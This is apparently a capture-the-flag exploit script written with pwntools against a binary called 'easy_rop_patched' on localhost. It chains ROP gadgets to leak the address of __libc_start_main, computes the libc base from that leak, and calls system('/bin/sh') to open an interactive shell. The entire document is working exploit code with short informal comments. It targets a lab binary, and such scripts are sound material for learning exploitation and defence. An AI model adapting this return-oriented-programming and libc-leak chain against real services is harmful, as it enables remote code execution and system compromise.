from pwn import *

e = ELF("./easy_rop_patched")
libc = ELF("./libc.so.6")
main = p64(e.symbols["main"]) # main 
ret = p64(e.symbols["main"] + 35) # ret gadget
syscall = p64(e.symbols["main"] + 32) # syscall gadget
rdi = p64(e.symbols["weird_func"] + 4)


io = remote("localhost", 5000)

# stack pivot to get us closer to __libc_start_main in the stack and then leak
io.sendline(ret * 13 + main)
io.wait(.2)

# overwrite to get to main so we can get 1 in rax and proc a sys write call to leak addresses then after that we want to go bak like we dont know anybody
io.sendline(ret * 8 + main + rdi + p64(1) + syscall * 2 + main * 2)
io.wait(.2)

#send 1 byte so read returns 1 for a sys write 
io.send(b"1")

# eat junk
io.recv(0x60)

# grab libc_start_main
leak = u64(io.recv(8))
print(hex(leak))
# get the base address calculated by the leaked __libc_start_main + 139
libc.address = (leak - 139) - libc.symbols["__libc_start_main"]

system = p64(libc.symbols["system"])
binsh = p64(next(libc.search(b"/bin/sh")))

io.sendline(ret * 6 +  rdi  + binsh * 2 + system)
#now we scan for this area in the got and parse it 
io.interactive()
